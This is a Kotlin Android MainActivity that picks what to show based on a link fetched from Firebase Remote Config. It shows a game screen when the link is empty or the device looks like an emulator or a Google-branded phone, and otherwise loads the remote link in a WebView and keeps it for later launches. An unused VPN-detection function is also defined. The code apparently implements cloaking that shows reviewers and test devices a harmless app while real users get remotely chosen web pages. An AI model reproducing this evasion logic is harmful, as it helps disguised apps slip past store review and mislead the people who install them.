package com.example.app7

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import com.example.app7.error.ErrorActivity
import com.example.app7.prefs.UserPreferencesImpl
import com.example.app7.utils.CheckInternet
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import java.util.*

class MainActivity : AppCompatActivity() {

    private val userPreferences = UserPreferencesImpl(this)
    private lateinit var remoteConfig: FirebaseRemoteConfig
    private var isOpened = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        supportActionBar?.hide()
        FirebaseApp.initializeApp(this)
        remoteConfig = FirebaseRemoteConfig.getInstance()
        setSettingsConfig()
    }

    override fun onResume() {
        super.onResume()
        checkLink()
    }

    private fun checkLink() {
        if (userPreferences.getLink()?.isNotEmpty() == true) {
            if (isOpened) {
                startActivity(Intent(this, GameActivity::class.java))
            } else {
                Handler().postDelayed({
                    hasSavedLink()
                }, 3000L)
            }
        } else {
            Handler().postDelayed({
                noSavedLink()
            }, 3000L)
        }
    }

    private fun hasSavedLink() {
        if (CheckInternet.internetAvailable(this)) {
            userPreferences.getLink()?.let { navigateToWebView(it) }
        } else {
            navigateToErrorActivity()
        }
    }

    private fun noSavedLink() {
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    if (remoteConfig.getString(getString(R.string.link_key)) == "" || checkIfEmulator()) {
                        startActivity(Intent(this, GameActivity::class.java))
                    } else {
                        val link = remoteConfig.getString(getString(R.string.link_key))
                        userPreferences.putLink(link)
                        navigateToWebView(link)
                    }
                }
            }
    }

    fun vpnActive(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
        var vpnInUse = false
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
            return caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
        }
        val networks = connectivityManager.allNetworks
        for (i in networks.indices) {
            val caps = connectivityManager.getNetworkCapabilities(networks[i])
            if (caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true
                break
            }
        }
        return vpnInUse
    }

    private fun checkIfEmulator(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result = result or (Build.BRAND.startsWith("generic")
                && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

    private fun setSettingsConfig() {
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 1500
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
    }

    private fun navigateToWebView(link: String) {
        val intent = Intent(this, WebViewActivity::class.java)
        intent.putExtra(getString(R.string.link_key), link)
        startActivity(intent)
        isOpened = true
    }

    private fun navigateToErrorActivity() {
        val intent = Intent(this, ErrorActivity::class.java)
        intent.putExtra(
            getString(R.string.error_key),
            getString(R.string.for_stability_work_app_you_need_internet_connection)
        )
        startActivity(intent)
    }


}
